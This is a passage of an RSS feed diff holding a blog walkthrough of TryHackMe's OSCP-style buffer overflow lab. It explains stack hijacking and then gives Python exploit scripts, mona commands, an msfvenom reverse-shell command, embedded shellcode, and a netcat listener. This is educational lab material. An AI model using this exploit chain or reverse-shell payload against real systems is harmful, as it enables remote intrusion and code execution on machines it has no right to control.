+VM that particularly caught my attention is hosted on <a href="https://tryhackme.com/">TryHackMe</a>, a brilliant platform for
+security enthusiasts and professionals to practice their skills. This VM is <a href="https://tryhackme.com/room/bufferoverflowprep">Buffer Overflow Prep</a>,
+which, according to friends who have taken the exam, it&rsquo;s pretty close to the OSCP exam BoF
+machine.</p>
+<p>The VM is pretty methodical: there are 10 BoF challenges pratically identical. I believe
+the objective is to practice speed, rather than a CTF challenge (where you practice solving
+puzzles and charades?). Before starting to crack this machine, let&rsquo;s first take a look
+at how does a simple buffer overflow (just like it appears on OSCP exam) work. If you already know how
+to exploit a simple BoF and are here for the writeup, you may skip this session. However,
+this is not exactly a writeup, since I&rsquo;m gonna show how to solve only one challenge, not the entire machine. But
+all challenges are identical: if you solve one, you&rsquo;ve solved them all.</p>
+<h2 id="buffer-overflow-to-remote-code-execution">Buffer overflow to remote code execution</h2>
+<p>Before we get started, let&rsquo;s first understand the scope of our problem. The OSCP buffer
+overflow is pretty basic and hardly resembles the way it is actually exploited in real
+life nowadays. The binary does not have stack protections: there&rsquo;s no canary and the
+stack is executable. In addition, although you may find ASLR, you will also find at least
+one lib which conveniently does not have ASLR. If you are new to binary exploitation and
+buffer overflow and don&rsquo;t know much about these protections, don&rsquo;t worry! They are not
+important at this point (well, they are disabled!). This is a very introductory binary
+exploitation post.</p>
+<p>Allright! How do we turn this buffer overflow into a remote code execution vulnerability?
+When I started in infosec this seemed pretty magical. The answer to that lies in how the
+memory is organized. I have done a similar explaination on how the stack works in
+<a href="hello-kernel">my other post about kernel exploitation</a> which I&rsquo;ll replicate below with a few
+slight modifications.</p>
+<p>The stack is used to store, amongst other things, local statically alocated variables, register values and return addresses.</p>
+<p>When a function is called (using the x86 call instruction), the current EIP (instruction pointer register) on the caller function is stored in the stack so the callee will be able to know where to return to. In the callee function prologue, the base pointer is also stored in the stack so it can be later recovered in the prologue.</p>
+<p>Another notable aspect of the stack is that it grows from higher addresses to lower ones. So when you push two elements into the stack, the first element pushed should have a higher address than the second.</p>
+<p>Ok, so let&rsquo;s try and visualize it:</p>
+<pre><code>+------------------------+ Lower addresses
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
++------------------------+ Top of the stack
+|                        | (Stack pointer)
+|                        |
+|                        |
+|  Function A Variables  |
+|                        |
+|                        |
+|                        |
++------------------------+ Base of the stack
+|                        | (Base pointer)
+|                        |
+|    ...                 |
+|                        |
+|                        |
++------------------------+Higher addresses
+</code></pre><p>Here we see the stack during the execution of some A function. Let&rsquo;s supose now that the A function calls a B function. The following should happen:</p>
+<ul>
+<li>The A function call instruction should push the return address into the stack so when B executes the RET instruction, it pops the return address from memory and sets the instruction pointer register to it.</li>
+<li>The B function should push the base pointer into the stack so it can be restored upon return.</li>
+</ul>
+<p>The stack should look like this:</p>
+<pre><code>+------------------------+ Lower addresses
+|                        |
+|                        |
+|                        |
+|                        |
+|                        |
++------------------------+Top of stack
+|                        |
+|  Function B Variables  |
+|                        |
++------------------------+Base of stack
+|  Previous base pointer |
++------------------------+
+|  Return address of A   |
++------------------------+
+|                        |
+|                        |
+|                        |
+|  Function A Variables  |
+|                        |
+|                        |
+|                        |
++------------------------+
+|                        |
+|                        |
+|    ...                 |
+|                        |
+|                        |
++------------------------+Higher addresses
+</code></pre><p>So say there&rsquo;s a stack overflow in B. If the overflow is large enough, the attacker should be able to overwrite the previous base pointer and, more interestingly, the return address.</p>
+<p>By overwriting the return address, when function B executes the RET instruction, instead of returning to A, the flow will be redirected to wherever the overwritten address controlled by the attacker points to, causing a flow hijack.</p>
+<p>Because the stack is executable, we can actually put our payload in the stack
+and use the overwritten return address to hijack the execution flow directly to
+our payload. If the return address is overwritten to the address of our payload
+in stack, it should be executed. However, it&rsquo;s pretty difficult to predict what&rsquo;s
+the address of our payload in stack, since the program is running on a remote machine.</p>
+<p>If we have a copy of the binary (and we have!), we can get the address of a <code>jmp esp</code>
+instruction throughout the program (in the .TEXT section or in a LIB whithout ASLR
+protection). Then, the return address will be overwritten to &ldquo;jmp esp&rdquo;. We just have
+to make sure our payload is correctly put to where esp is pointing. After the <code>jmp esp</code>
+instruction is called, the flow will be redirected to the payload.</p>
+<p>Ok, maybe that&rsquo;s a little bit fuzzy&hellip; let&rsquo;s get our hands dirty and solve a challenge.</p>
+<h2 id="firing-up-the-vm-and-exploiting-it">Firing up the VM and exploiting it</h2>
+<p>We warm up our Kali Linux VM, start the TryHackme challenge and go!
+First, allow me to introduce the environment. I have Kali Linux running in a VM:
+<img src="/posts/oscp-bof-img/kali.png" alt="Kali Linux Environment"></p>
+<p>From this environment, I can connect to the target machine via RDP (the
+credentials are given in the TryHackme page):
+<img src="oscp-bof-img/rdp.png" alt="RDP"></p>
+<p>Following TryHackme instructions, we open the Immunity Debugger, which is the same
+one used in the OSCP exam. It also comes with a plugin named Mona, which helps the
+exploitation a bit.</p>
+<p>In the debugger, we open the vulnerable binary and run it. This is what it looks
+like:<br>
+<img src="oscp-bof-img/immunity.png" alt="Immunity Debugger" title="Immunity Debugger"></p>
+<p>According to TryHackme instructions, the binary listens to port 1337. Let&rsquo;s see:
+<img src="oscp-bof-img/bin0.png" alt="Connecting to binary" title="Connecting to binary">
+Ok. We try its game and enter HELP:
+<img src="oscp-bof-img/bin1.png" alt="Connecting to binary" title="Connecting to binary">
+Let&rsquo;s see this OVERFLOW1:
+<img src="oscp-bof-img/bin2.png" alt="Connecting to binary" title="Connecting to binary">
+Right. Since it is a known fact that this binary is vulnerable to buffer overflow,
+one may try and trigger the overflow to cause a crash:
+<img src="oscp-bof-img/bin3.png" alt="Connecting to binary" title="Connecting to binary">
+On the debugger we may see that the program crashed and some interesting stuff:
+<img src="oscp-bof-img/bin4.png" alt="Connecting to binary" title="Connecting to binary">
+The stack pointer (ESP) points to a lot of As, exactly as we sent it. The
+instruction pointer (EIP) value is 0x41414141, which is AAAA in hex. This
+means we also control it somewhere along the buffer we sent.</p>
+<p>We can figure out the offsets of EIP and ESP on our payload by using the tools
+<a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb">pattern_create</a> and <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb">pattern_offset</a>.
+Both come in Kali Linux and may be found in the directory <code>/usr/share/metasploit-framework/tools/exploit/</code>.
+The former will create a string forming a pattern and the latter will read 4 bytes
+of that pattern and tell the offset. First, we generate the string:
+<img src="oscp-bof-img/pattern_create.png" alt="Pattern Create" title="Pattern create"></p>
+<p>Then we send it:
+<img src="oscp-bof-img/pattern_crash.png" alt="Pattern Create" title="Pattern create"></p>
+<p><img src="oscp-bof-img/pattern_crash1.png" alt="Pattern Create" title="Pattern create"></p>
+<p>As it may be observed, the ESP starts with 0Co1 and the value of
+EIP is <code>0x6f43396e</code>. If we convert the EIP value to ASCII and account
+for the endianess, this is what we get:</p>
+<p><img src="oscp-bof-img/convertion.png" alt="Pattern Create" title="Pattern create"></p>
+<p>Then <code>pattern_offset</code> can be used to retrieve the offsets of EIP and ESP:</p>
+<p><img src="oscp-bof-img/offsets.png" alt="Pattern Create" title="Pattern create"></p>
+<p>Finally, we do a python proof of concept which will connect to the vulnerable
+server and send a payload which will not only crash, but confirm that our offsets
+are reliable. The payload we&rsquo;ll send is:
+<code>AAAA... (1978 As) ...AABBBBCCCCCCCCCCCCCCCC</code></p>
+<p>When the program crash, the EIP should be BBBB (0x42424242) and ESP should
+point to CCCCCCCCCCCCCCCC.</p>
+<p>You may see the PoC below:</p>
+<pre><code>import socket
+
+ip = &quot;10.10.116.211&quot;
+port = 1337
+timeout = 5
+
+payload = 'A'*1978 + 'B' * 4 + 'C' * 16
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(timeout)
+con = s.connect((ip, port))
+s.recv(1024)
+
+s.send(&quot;OVERFLOW1 &quot; + payload)
+
+s.recv(1024)
+s.close()
+
+</code></pre><p>And BOOM:</p>
+<p><img src="oscp-bof-img/boom.png" alt="Boom" title="Boom!"></p>
+<p>Exactly as we predicted. Now we may hijack the execution flow. But first,
+we need to worry about badchards!</p>
+<h3 id="badchars">Badchars</h3>
+<p>What are badchars? Where do they live? What do they eat?</p>
+<p>Not all chars are good chars for your payload. For example, if your payload
+has the <code>\0</code> char, somewhere along the way the program might confuse it with
+the end of a string and drop everything after this character on your payload.</p>
+<p>Another example is the carriage return character. This may signal the program
+that the input has ended.</p>
+<p>And a few other characters may spoil your payload if not removed. So before you
+go any further, you should find these badchars and make sure your payload does not
+contain any of them.</p>
+<p>First, we should generate a script which will send all chars. Then we use mona
+to find which chars are missing. The script below is an example:</p>
+<pre><code>import socket
+
+ip = &quot;10.10.116.211&quot;
+port = 1337
+timeout = 5
+
+ignore_chars = [&quot;\x00&quot;]
+badchars = &quot;&quot;
+for i in range(256):
+    if chr(i) not in ignore_chars:
+        badchars += chr(i)
+
+
+payload = &quot;A&quot; * 1982 + badchars
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(timeout)
+con = s.connect((ip, port))
+s.recv(1024)
+
+s.send(&quot;OVERFLOW1 &quot; + payload)
+
+s.recv(1024)
+s.close()
+</code></pre><p>Note that &ldquo;\x00&rdquo; is an obvious badchar (end of string). So we remove it.
+All the other chars are sequentially sent at offset 1982 (place to where
+ESP points).</p>
+<p>Before the script is ran, mona requires some setup. First, we set its
+working folder:
+<code>!mona config -set workingfolder c:\mona\%p</code></p>
+<p><img src="oscp-bof-img/mona-config0.png" alt="Mona config" title="Mona config"></p>
+<p>Now we tell mona to create a bytearray. It will create a byte array from byte 0 to 255,
+except for the ones we tell it to ignore (byte &ldquo;\x00&rdquo;, in this case):</p>
+<p><code>!mona bytearray -b &quot;\x00&quot;</code></p>
+<p><img src="oscp-bof-img/mona-bytearray.png" alt="Mona config" title="Mona config">
+Note that the output is saved to <code>bytearray.bin</code>.</p>
+<p>Finally, we run the script and ask mona to compare the bytes we sent to the bytes in memory:</p>
+<p><code>!mona compare -f C:\mona\oscp\bytearray.bin -a esp</code></p>
+<p><img src="oscp-bof-img/badchars.png" alt="Badchars" title="Bad chars"></p>
+<p>Note that there are several consecutive badchars. It is not uncommon that one badchar will
+mess with the next char, even if it is legit. One way to get the actual badchars is to repeat
+the process several times, eliminating at each iteraction the first badchar that is not yet
+ignored. We remove then <code>\x07</code> from the bytearrays and try again:</p>
+<p><img src="oscp-bof-img/badchars2.png" alt="Badchars" title="Bad chars"></p>
+<pre><code>import socket
+
+ip = &quot;10.10.116.211&quot;
+port = 1337
+timeout = 5
+
+ignore_chars = [&quot;\x00&quot;, &quot;\x07&quot;]
+badchars = &quot;&quot;
+for i in range(256):
+    if chr(i) not in ignore_chars:
+        badchars += chr(i)
+
+
+payload = &quot;A&quot; * 1982 + badchars
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(timeout)
+con = s.connect((ip, port))
+s.recv(1024)
+
+s.send(&quot;OVERFLOW1 &quot; + payload)
+
+s.recv(1024)
+s.close()
+
+</code></pre><p>And we find out that <code>\x08</code> isn&rsquo;t a badchar after all:</p>
+<p><img src="oscp-bof-img/badchars3.png" alt="Badchars" title="Bad chars"></p>
+<p>After this process is iterated until the last badchar, we find out that the badchars
+are actually <code>\x00\x07\x2e\xa0</code>.</p>
+<h2 id="generating-a-shellcode-to-get-rce">Generating a shellcode to get RCE</h2>
+<p>Now that we know the badchars and can put a payload in the stack (which is, luckly, executable),
+we finally need to generate a payload which will turn into remote code execution. You can either
+code it in C and compile, code it in assembly, or take advantage of the work of nice men and women
+which made msfvenom possible:</p>
+<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;your_ip_address&gt; LPORT=1234 EXITFUNC=thread -b &quot;\x00\x07\x2e\xa0&quot; -f python</code></p>
+<p>Where <code>LHOST</code> is your ip address, <code>LPORT</code> a local port of your preference, <code>EXITFUNC=thread</code> indicates that it will spawn a new thread for this reverse shell (for stability!!!), <code>b</code> precedes the badchars and <code>-f python</code> indicates that the shellcode output should be in python. This is the result:</p>
+<p><img src="oscp-bof-img/msfvenom.png" alt="msfvenom" title="msfvenom"></p>
+<h2 id="triggering-the-shellcode">Triggering the shellcode</h2>
+<p>We have a payload. We can put the payload in the right place of the stack. Now
+we need to trigger this shellcode. One way to do this is the forementioned <code>jmp esp</code>
+approach. Once again we use mona. This time to find a <code>jmp esp</code> gadget which will placed
+in EIP to trigger the shellcode.</p>
+<p><code>!mona jmp -r esp -cpb &quot;\x00\x07\x2e\xa0&quot;</code></p>
+<p><img src="oscp-bof-img/gadget.png" alt="Gadgets" title="Gadgets"></p>
+<p>Mona found a few executable addresses with the <code>jmp esp</code> instruction and ASLR disabled.
+I chose 0x620511af for my exploit.</p>
+<h2 id="pwning">pwning</h2>
+<p>Our final exploit:</p>
+<pre><code>import socket
+
+ip = &quot;10.10.28.178&quot;
+port = 1337
+timeout = 5
+
+padding = &quot;A&quot; * 1978
+eip = &quot;\xaf\x11\x50\x62&quot; # Compensating for the endianess
+nops = &quot;\x90&quot; * 32 # Give space for the payload to grow!
+buf =  b&quot;&quot;
+buf += b&quot;\xd9\xc3\xd9\x74\x24\xf4\x5e\xb8\x76\x3e\xf4\xe1\x33&quot;
+buf += b&quot;\xc9\xb1\x52\x83\xc6\x04\x31\x46\x13\x03\x30\x2d\x16&quot;
+buf += b&quot;\x14\x40\xb9\x54\xd7\xb8\x3a\x39\x51\x5d\x0b\x79\x05&quot;
+buf += b&quot;\x16\x3c\x49\x4d\x7a\xb1\x22\x03\x6e\x42\x46\x8c\x81&quot;
+buf += b&quot;\xe3\xed\xea\xac\xf4\x5e\xce\xaf\x76\x9d\x03\x0f\x46&quot;
+buf += b&quot;\x6e\x56\x4e\x8f\x93\x9b\x02\x58\xdf\x0e\xb2\xed\x95&quot;
+buf += b&quot;\x92\x39\xbd\x38\x93\xde\x76\x3a\xb2\x71\x0c\x65\x14&quot;
+buf += b&quot;\x70\xc1\x1d\x1d\x6a\x06\x1b\xd7\x01\xfc\xd7\xe6\xc3&quot;
+buf += b&quot;\xcc\x18\x44\x2a\xe1\xea\x94\x6b\xc6\x14\xe3\x85\x34&quot;
+buf += b&quot;\xa8\xf4\x52\x46\x76\x70\x40\xe0\xfd\x22\xac\x10\xd1&quot;
+buf += b&quot;\xb5\x27\x1e\x9e\xb2\x6f\x03\x21\x16\x04\x3f\xaa\x99&quot;
+buf += b&quot;\xca\xc9\xe8\xbd\xce\x92\xab\xdc\x57\x7f\x1d\xe0\x87&quot;
+buf += b&quot;\x20\xc2\x44\xcc\xcd\x17\xf5\x8f\x99\xd4\x34\x2f\x5a&quot;
+buf += b&quot;\x73\x4e\x5c\x68\xdc\xe4\xca\xc0\x95\x22\x0d\x26\x8c&quot;
+buf += b&quot;\x93\x81\xd9\x2f\xe4\x88\x1d\x7b\xb4\xa2\xb4\x04\x5f&quot;
+buf += b&quot;\x32\x38\xd1\xf0\x62\x96\x8a\xb0\xd2\x56\x7b\x59\x38&quot;
+buf += b&quot;\x59\xa4\x79\x43\xb3\xcd\x10\xbe\x54\xf8\xe9\xc3\x2f&quot;
+buf += b&quot;\x94\xf3\xc3\x2b\xb7\x7d\x25\x59\x27\x28\xfe\xf6\xde&quot;
+buf += b&quot;\x71\x74\x66\x1e\xac\xf1\xa8\x94\x43\x06\x66\x5d\x29&quot;
+buf += b&quot;\x14\x1f\xad\x64\x46\xb6\xb2\x52\xee\x54\x20\x39\xee&quot;
+buf += b&quot;\x13\x59\x96\xb9\x74\xaf\xef\x2f\x69\x96\x59\x4d\x70&quot;
+buf += b&quot;\x4e\xa1\xd5\xaf\xb3\x2c\xd4\x22\x8f\x0a\xc6\xfa\x10&quot;
+buf += b&quot;\x17\xb2\x52\x47\xc1\x6c\x15\x31\xa3\xc6\xcf\xee\x6d&quot;
+buf += b&quot;\x8e\x96\xdc\xad\xc8\x96\x08\x58\x34\x26\xe5\x1d\x4b&quot;
+buf += b&quot;\x87\x61\xaa\x34\xf5\x11\x55\xef\xbd\x32\xb4\x25\xc8&quot;
+buf += b&quot;\xda\x61\xac\x71\x87\x91\x1b\xb5\xbe\x11\xa9\x46\x45&quot;
+buf += b&quot;\x09\xd8\x43\x01\x8d\x31\x3e\x1a\x78\x35\xed\x1b\xa9&quot;
+
+
+payload = padding + eip + nops + buf
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.settimeout(timeout)
+con = s.connect((ip, port))
+s.recv(1024)
+
+s.send(&quot;OVERFLOW1 &quot; + payload)
+
+s.recv(1024)
+s.close()
+</code></pre><p>One important detail is to put NOPs (instructions that actually do nothing) before the
+shellcode. It won&rsquo;t interfere with the payload. When a NOP gets executed, nothing happens. It jumps to the next instruction.</p>
+<p>This is importante because the payload is directly in the memory address to which <code>ESP</code> points,
+so a simple push or pop operation could corrupt the shellcode.</p>
+<p>We listen with netcat <code>nc -nvlp 1234</code> and run the exploit. The result is absolute success:</p>
+<p><img src="oscp-bof-img/pwned.png" alt="Pwned" title="Pwned"></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>In this post we exploited an OSCP-like buffer overflow challenge from TryHackMe. I hope
+it makes clear how to exploit this class of memory corruption vulnerability. The most
+important part here is to learn the method and practice. This kind of challenge can be
+solved following the steps below:</p>
+<ul>
+<li>Cause a crash to confirm it is a BoF vulnerability</li>
+<li>Find EIP and ESP offsets</li>
+<li>Find badchars</li>
+<li>Generate payload</li>
+<li>Find a <code>jmp esp</code> gadget</li>
+<li>Put the gadget address in EIP offset and shellcode in ESP offset</li>
+<li>Get shell
+Besides following these steps, one must be careful not to fall in the common mistakes, such
+as forgetting to append NOPs before the shellcode, wrong badchars, forget to consider badchars
+when generating the msfvenom payload, account for endianess or using the correct payload.</li>
+</ul>
+<p>Finally, the secret is practice, practice, practice.</p>
+]]></content>
+		</item>
+		
+	</channel>
 </rss>
